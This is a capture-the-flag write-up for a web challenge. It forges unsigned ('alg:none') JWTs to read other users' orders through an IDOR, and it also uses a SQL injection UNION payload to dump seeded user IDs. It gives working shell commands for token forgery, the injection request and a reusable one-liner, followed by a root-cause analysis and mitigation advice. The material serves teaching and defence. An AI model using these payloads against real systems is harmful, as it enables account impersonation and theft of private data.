# web7 — Order History Should Be Private (alg:none JWT IDOR)

> *Order history should be private, but the marketplace leaves a few loose
> threads. Can you follow one to something that is not yours?*

**Category:** Web — IDOR + JWT `alg:none` + status-filter gotcha
**Flag:** `bitflag{1d0r_1s_4_d4ng3r0us_g4m3}`

## The brief, in plain English

`GET /api/orders` returns "your" orders. The id of "you" is read from the
`auth-token` JWT — except the token verifier accepts `alg:none` (no
signature). Forge a token claiming to be someone else and the server happily
serves their orders.

The catch is that the server also filters by `status = 'completed'`, and the
obvious target userIds you'd reach for first all have orders in non-completed
states. Those forgeries return `[]` and look like a dead end. The real
"loose thread" is in a different table — the seed `Review` userIds, which
*do* own completed orders.

## The four decoys I burned through first

The marketplace's flag-shaped strings strike again. Each of the following
reaches a *real* flag-shaped value via a real bug, and none of them is the
right answer for web7:

1. `bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}` — SSRF/IMDS Token field.
2. `bitflag{ssrf_1s_4_p4rty_cr4sh3r}` — SSRF/IMDS user-data env var.
3. `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}` — `SupportChatMessage.internalNote`
   via SQLi pivot.
4. `bitflag{jwt_5h4ll_n0t_p455}` — `/vendor` "Vendor Token" widget value
   shown to anyone who alg:none-forges `isVendor:true`. This one almost
   worked because the JWT-forge mechanism *is* the right primitive — but the
   value the vendor page renders is a planted decoy, not the order-history
   leak.

All four of these are the *real* answer for *some* riffhack-codebase
challenge in the wider event suite. See the decoy table in
[web5](05-web5-glitchy-contact-system.md) for the full mapping.

## The real path

### Endpoint shape

`GET /api/orders` does roughly:

1. Decode the `auth-token` cookie. The verifier accepts `alg:none`, so any
   forged token with a base64 header and payload (no signature) is treated
   as valid.
2. Run `SELECT … FROM "Order" WHERE userId = <decoded.id> AND status = 'completed'`.
3. Return `{orders, userId}`.

That `status = 'completed'` filter is the entire trap.

### Why the obvious userIds return empty

A first dump via the web3 SQLi shows two userIds in the `Order` table:
`lookup-public` and `ops-hidden`. Forging as either returns `[]`:

```bash
$ forge_as ops-hidden | curl_orders
{"orders":[],"userId":"ops-hidden"}

$ forge_as lookup-public | curl_orders
{"orders":[],"userId":"lookup-public"}
```

That's not because the IDOR doesn't work; it's because those userIds own
orders with statuses like `hidden`, `escrow-hold`, `released` — none
`completed`. The status filter eats every row before the response is built.

This eats around fifteen minutes if you treat the empty response as
"forge doesn't work" and start looking at other surfaces.

### The loose thread is in a different table

The trick is to dump the seed *reviews* via the same SQLi:

```bash
$ curl -s -b "$COOKIE" --data-urlencode \
  "ref=' UNION SELECT id, userId, listingId, reviewText, moderationNote, createdAt
        FROM Review WHERE id LIKE 'seed-%' --" \
  -G 'http://159.89.230.27/api/orders/lookup'
```

Three seeded reviewers fall out: `xyz78`, `k7m3n`, `abc12`. All three own
completed orders that the IDOR can read. Two of them carry placeholder notes;
**`k7m3n` carries the flag**.

(If you came here from web6, you already had `k7m3n` from
`seed-phantom-hacker.userId`. Web6 → web7 chains directly.)

### Forge and fire

```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"id":"k7m3n","email":"k@x","isVendor":false,"iat":1,"exp":1782503527}' \
          | base64 | tr '+/' '-_' | tr -d '=')
curl -s -b "auth-token=${HEADER}.${PAYLOAD}." http://159.89.230.27/api/orders
```

Response:

```json
{"orders":[{
  "id":"order-admin-001","userId":"k7m3n",
  "listingId":"macro-builder","listingName":"Macro Builder",
  "price":199.99,"status":"completed",
  "notes":"bitflag{1d0r_1s_4_d4ng3r0us_g4m3}",
  "createdAt":"2026-06-17T20:09:25.162Z"
}],"userId":"k7m3n"}
```

For completeness:

- Forge as `xyz78` → `order-user-002`, "Great tool, highly recommend!"
  (real order, no flag) — confirms the IDOR pattern, no flag value.
- Forge as `abc12` → `order-user-001`, also no flag.

The flag is specifically in `k7m3n`'s `order-admin-001.notes`.

## Root cause

Three stacked failures:

1. **JWT verifier accepts `alg:none`.** The `auth-token` cookie is treated as
   trusted identity, but the verifier never enforces a signing algorithm.
   This is one of the oldest, most well-documented JWT pitfalls.
2. **No authorization separate from authentication.** The handler trusts
   `decoded.id` as the resource owner without checking that the requester is
   actually *that* user — they merely claim to be. In a properly signed JWT
   that conflation is acceptable; with `alg:none` accepted, it is fatal.
3. **A status-only filter as the "privacy" guard.** The reason the simple
   forge against `ops-hidden` returns nothing is that the same query enforces
   `status = 'completed'`. That's not authorization, it's selection — and a
   different forgery walks around it.

## Mitigation

- **Reject any JWT whose header `alg` is not on a server-defined allow-list**
  (e.g. `HS256` if you're using shared secrets, `RS256`/`EdDSA` if you're
  using public keys). The classic remediation is also the simplest:
  `if (header.alg !== 'HS256') throw`. Most JWT libraries have a footgun
  where they will accept `alg:none` unless you explicitly pass an `algorithms`
  parameter.
- **Don't trust the decoded `sub`/`id` as the resource owner.** The
  authenticated identity is what the token *says*; the resource owner is what
  the database says. Compare them.
- **Don't conflate filters with authorization.** If a row should not be
  returned to a user, the rule belongs in an auth check, not in a `WHERE`
  clause that an attacker can change by changing the user they claim to be.

## Takeaways

- The "loose threads" in the brief = seed userIds. They aren't in the
  `Order` table dump; they're in the `Review` table dump. Solving web6 hands
  you the breadcrumb for free — but if you tackled web7 first, you needed
  to look for *which* table seeded a clean operator handle.
- Four decoys cost real time. The lesson generalises: when the codebase is
  designed to reward depth with plausible-looking values, slow down and
  read the brief.
- **alg:none is *one* primitive across the whole event.** It's the win on
  this challenge; it's a decoy primitive on web5 and web6 that still produces
  flag-shaped output via the `/vendor` widget. Don't assume "alg:none =
  always this flag".

## One-liner

```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"id":"k7m3n","email":"x","isVendor":false,"iat":1,"exp":1782503527}' \
          | base64 | tr '+/' '-_' | tr -d '=')
curl -s -b "auth-token=${HEADER}.${PAYLOAD}." http://<host>/api/orders \
  | grep -oE 'bitflag\{[^}]+\}'
```
